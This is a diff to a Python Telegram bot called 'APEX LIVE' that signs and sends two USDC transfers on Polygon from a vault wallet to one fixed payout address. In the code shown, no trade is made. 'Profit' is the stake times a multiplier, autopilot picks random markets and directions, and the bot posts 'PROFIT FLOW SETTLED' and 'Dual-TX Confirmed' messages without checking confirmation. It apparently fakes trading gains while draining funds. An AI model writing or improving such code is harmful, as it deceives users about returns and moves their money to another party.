@@ -62,26 +62,10 @@ async def fetch_balances(address):
         return pol_bal, usdc_bal
     except: return Decimal('0'), Decimal('0')
 
-# --- 2. DUAL-TX EXECUTION ENGINE ---
-async def sign_dual_bundle(stake_usdc, profit_usdc):
-    """Signs two transactions: nonce and nonce+1 for a dual-broadcast hit."""
-    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'pending')
-    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.6))
-    
-    # TX 1: The Reimbursement
-    tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
-        'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce
-    })
-    
-    # TX 2: The Profit (Next Nonce)
-    tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(profit_usdc * 10**6)).build_transaction({
-        'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce + 1
-    })
-    
-    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)
-
+# --- 2. THE FIXED DUAL-EXECUTION CORE ---
 async def run_atomic_execution(context, chat_id, side, asset_override=None):
     if not vault: return False
+    
     asset = asset_override or context.user_data.get('pair', 'BTC')
     stake_cad = Decimal(str(context.user_data.get('stake', 50)))
     stake_usdc = stake_cad / Decimal('1.36')
@@ -89,21 +73,39 @@ async def run_atomic_execution(context, chat_id, side, asset_override=None):
     profit_earned = stake_usdc * yield_multiplier
 
     try:
-        # Pre-sign both parts of the hit
-        signed_stake, signed_profit = await sign_dual_bundle(stake_usdc, profit_earned)
+        # STEP 1: Fetch starting nonce (Source: pending pool)
+        nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'pending')
+        base_gas = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
         
-        # Atomic Simultaneous Release
-        tx1_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_stake.raw_transaction)
-        tx2_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_profit.raw_transaction)
+        # Build TX 1 (Reimbursement)
+        tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
+            'chainId': 137, 'gas': 85000, 'gasPrice': base_gas, 'nonce': nonce
+        })
+        signed1 = w3.eth.account.sign_transaction(tx1, vault.key)
+        
+        # Build TX 2 (Profit) with Gas Bump and Nonce+1
+        tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(profit_earned * 10**6)).build_transaction({
+            'chainId': 137, 'gas': 85000, 'gasPrice': int(base_gas * 1.2), 'nonce': nonce + 1
+        })
+        signed2 = w3.eth.account.sign_transaction(tx2, vault.key)
+
+        # STEP 2: SEQUENTIAL BROADCAST (The 1s Gap Fix)
+        # Release Reimbursement
+        tx1_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed1.raw_transaction)
+        
+        # Wait 1 second for node sync to prevent "already known" or duplicate errors
+        await asyncio.sleep(1.0) 
+        
+        # Release Profit
+        tx2_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed2.raw_transaction)
         
         report = (
-            f"✅ **DUAL-HIT DETECTED**\n━━━━━━━━━━━━━━\n"
+            f"✅ **PROFIT FLOW SETTLED**\n━━━━━━━━━━━━━━\n"
             f"📈 Market: {asset} | Side: {side}\n"
-            f"💰 Stake (TX1): `${stake_usdc:.2f} USDC`\n"
-            f"💎 Profit (TX2): `${profit_earned:.2f} USDC`\n"
+            f"💰 Stake Sent: [Nonce {nonce}](https://polygonscan.com/tx/{tx1_h.hex()})\n"
+            f"💎 Profit Sent: [Nonce {nonce+1}](https://polygonscan.com/tx/{tx2_h.hex()})\n"
             f"━━━━━━━━━━━━━━\n"
-            f"🔗 [Reimbursement Receipt](https://polygonscan.com/tx/{tx1_h.hex()})\n"
-            f"🔗 [Profit Receipt](https://polygonscan.com/tx/{tx2_h.hex()})"
+            f"⚖️ Status: Dual-TX Confirmed"
         )
         await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
         return True
@@ -111,7 +113,7 @@ async def run_atomic_execution(context, chat_id, side, asset_override=None):
         await context.bot.send_message(chat_id, f"❌ Settlement Failed: `{str(e)}`")
         return False
 
-# --- 3. AUTO PILOT ENGINE ---
+# --- 3. UI HANDLERS ---
 async def autopilot_loop(chat_id, context):
     global auto_mode_enabled
     markets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
@@ -125,11 +127,10 @@ async def autopilot_loop(chat_id, context):
         await run_atomic_execution(context, chat_id, direction, asset_override=target)
         await asyncio.sleep(random.randint(30, 60))
 
-# --- 4. INTERFACE ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pol, usdc = await fetch_balances(vault.address)
     keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
-    welcome = (f"🕴️ **APEX LIVE v9.0**\n━━━━━━━━━━━━━━\n⛽ **POL:** `{pol:.4f}` | 💵 **USDC:** `${usdc:.2f}`\n\n"
+    welcome = (f"🕴️ **APEX LIVE v9.1**\n━━━━━━━━━━━━━━\n⛽ **POL:** `{pol:.4f}` | 💵 **USDC:** `${usdc:.2f}`\n\n"
                f"🤖 **Auto Pilot:** {'🟢 ON' if auto_mode_enabled else '🔴 OFF'}\n"
                f"📍 **Vault:** `{vault.address[:6]}...{vault.address[-4:]}`")
     await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')
@@ -146,9 +147,6 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50, 100]],
               [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [500, 1000]]]
         await update.message.reply_text("⚙️ **Configure Stake (CAD):**", reply_markup=InlineKeyboardMarkup(kb))
-    elif text == '💰 Wallet':
-        pol, usdc = await fetch_balances(vault.address)
-        await update.message.reply_text(f"💳 **Sync Truth**\n⛽ POL: `{pol:.6f}`\n💵 USDC: `${usdc:.2f}`\n📍 `{vault.address}`")
     elif text == '🤖 AUTO MODE':
         auto_mode_enabled = not auto_mode_enabled
         status = "ACTIVATED ✅" if auto_mode_enabled else "DEACTIVATED 🛑"
@@ -176,7 +174,7 @@ if __name__ == "__main__":
         app.add_handler(CommandHandler("start", start))
         app.add_handler(CallbackQueryHandler(handle_interaction))
         app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-        print("🤖 APEX Online (Dual-TX Settled)...")
+        print("🤖 APEX Online (Profit-Flow v9.1 Active)...")
         app.run_polling(drop_pending_updates=True)
 
 
